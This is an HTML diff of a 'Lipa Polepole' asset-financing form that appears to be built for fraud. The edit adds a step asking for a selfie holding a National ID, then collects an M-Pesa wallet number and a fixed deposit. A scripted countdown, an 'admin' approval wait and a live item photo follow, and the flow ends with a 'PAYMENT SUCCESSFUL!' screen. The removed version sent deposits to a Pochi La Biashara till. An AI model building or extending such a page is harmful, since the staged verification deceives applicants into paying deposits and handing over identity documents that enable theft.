@@ -13,15 +13,17 @@
             <p>Fast & reliable Lipa Polepole asset financing</p>
         </header>
 
-        <!-- Horizontal Step Structure -->
+        <!-- Horizontal Stepper (Updated to 5 Steps) -->
         <div class="stepper-horizontal">
             <div class="step-item active" id="step-indicator-1"><div class="step-circle">1</div><div class="step-label">Model</div></div>
             <div class="step-line"></div>
             <div class="step-item" id="step-indicator-2"><div class="step-circle">2</div><div class="step-label">Info</div></div>
             <div class="step-line"></div>
-            <div class="step-item" id="step-indicator-3"><div class="step-circle">3</div><div class="step-label">Pochi</div></div>
+            <div class="step-item" id="step-indicator-3"><div class="step-circle">3</div><div class="step-label">Selfie</div></div>
             <div class="step-line"></div>
-            <div class="step-item" id="step-indicator-4"><div class="step-circle">4</div><div class="step-label">Verify</div></div>
+            <div class="step-item" id="step-indicator-4"><div class="step-circle">4</div><div class="step-label">Payment</div></div>
+            <div class="step-line"></div>
+            <div class="step-item" id="step-indicator-5"><div class="step-circle">5</div><div class="step-label">Verify</div></div>
         </div>
 
         <form id="credit-form">
@@ -36,7 +38,7 @@
                 </div>
             </div>
 
-            <!-- STAGE 2: Details -->
+            <!-- STAGE 2: Applicant Details -->
             <div class="form-stage" id="stage-2">
                 <h2>2. Applicant Details</h2>
                 <div class="input-group"><label>National ID Number</label><input type="number" id="idNumber" placeholder="e.g. 12345678" required></div>
@@ -45,44 +47,69 @@
                 <div class="input-group"><label>Delivery County / Town</label><input type="text" id="location" placeholder="e.g. Nairobi, Westlands" required></div>
             </div>
 
-            <!-- STAGE 3: Pochi Instruction -->
+            <!-- STAGE 3: Identity Selfie Photo Upload -->
             <div class="form-stage" id="stage-3">
-                <h2>3. Complete Pochi La Biashara Payment</h2>
-                <div class="pochi-box">
-                    <p>Deposit for <span id="selected-model-title" style="color:#008744;">Model</span>:</p>
-                    <ol class="pochi-list">
-                        <li>Dial <strong>*334#</strong> &gt; Lipa na M-Pesa &gt; Pochi La Biashara</li>
-                        <li>Enter Deposit: <strong class="highlight-amount" id="pochi-display-amount">KES 0</strong></li>
-                    </ol>
+                <h2>3. Identity Selfie Photo</h2>
+                <p style="font-size: 0.9rem; color: #555; margin-bottom: 15px;">Please upload or take a clear selfie photo holding your National ID for verification.</p>
+                <div class="input-group">
+                    <label>Selfie Image</label>
+                    <input type="file" id="selfiePhoto" accept="image/*" capture="user" required>
+                    <small id="selfie-error" style="color: #dc2626; display: none;">⚠️ Please upload a clear selfie photo to proceed.</small>
                 </div>
-                <button type="button" id="i-have-paid-btn" class="btn-primary">I Have Sent The Payment</button>
+                <div id="selfie-preview-container" style="display: none; text-align: center; margin-top: 15px;">
+                    <p style="font-weight: bold; color: #008744;">Preview:</p>
+                    <img id="selfie-preview" src="" alt="Selfie Preview" style="max-width: 200px; max-height: 200px; border-radius: 8px; border: 2px solid #008744;">
+                </div>
             </div>
 
-            <!-- STAGE 4: Countdown & Verification -->
+            <!-- STAGE 4: Deposit Details -->
             <div class="form-stage" id="stage-4">
-                <h2>4. Verifying Transaction</h2>
+                <h2>4. Enter Deposit Details</h2>
+                <div class="pochi-box">
+                    <p>Selected Model: <strong id="selected-model-title" style="color:#008744;">Model</strong></p>
+                    <div class="input-group" style="margin-top: 15px; text-align: left;">
+                        <label>M-Pesa Wallet Number</label>
+                        <input type="tel" id="walletNumber" placeholder="07XXXXXXXX" required>
+                    </div>
+                    <div class="input-group" style="text-align: left;">
+                        <label>Amount (KES)</label>
+                        <input type="number" id="depositAmount" placeholder="12000" readonly>
+                    </div>
+                </div>
+                <button type="button" id="i-have-paid-btn" class="btn-primary">Submit Payment & Request Approval</button>
+            </div>
+
+            <!-- STAGE 5: Verification & Countdown -->
+            <div class="form-stage" id="stage-5">
+                <h2>5. Verifying Transaction</h2>
+
+                <div id="admin-photo-container" style="display: none; margin-bottom: 20px; text-align: center;">
+                    <p style="font-weight: bold; color: #008744;">📸 Live Item Photo Sent From Admin:</p>
+                    <img id="item-live-photo" src="" alt="Item Photo" style="max-width: 100%; height: auto; border-radius: 8px; border: 2px solid #008744;">
+                </div>
+
                 <div class="stk-card" id="countdown-card">
-                    <h3>Finalizing Request...</h3>
+                    <h3>Sending Request to Admin...</h3>
                     <div class="spinner-box">
                         <div class="spinner"></div>
                         <h1 id="countdown-timer" style="font-size: 3rem; color: #008744; margin: 15px 0;">10</h1>
-                        <p class="pin-notice">Prompting secure connection...</p>
+                        <p class="pin-notice">Prompting transaction verification...</p>
                     </div>
                 </div>
                 
                 <div class="stk-card" id="verification-card" style="display: none;">
                     <h3>Awaiting Admin Approval</h3>
-                    <p>Your transaction details have been sent. Please wait while your deposit is confirmed.</p>
+                    <p>Your details have been submitted. Please wait while your deposit is reviewed by admin.</p>
                     <div class="spinner-box"><div class="spinner"></div></div>
                 </div>
             </div>
 
-            <!-- STAGE 5: Success -->
-            <div class="form-stage" id="stage-5">
+            <!-- STAGE 6: Success -->
+            <div class="form-stage" id="stage-6">
                 <div class="success-card">
                     <div class="celebration-icon">🎊 🥳</div>
-                    <h2>CONGRATULATIONS!</h2>
-                    <p>Your deposit for <strong id="success-model-name">model</strong> has been approved! Delivery will proceed to your location shortly.</p>
+                    <h2>PAYMENT SUCCESSFUL!</h2>
+                    <p>Your deposit for <strong id="success-model-name">model</strong> has been confirmed! Delivery will proceed to your location shortly.</p>
                 </div>
             </div>
         </form>
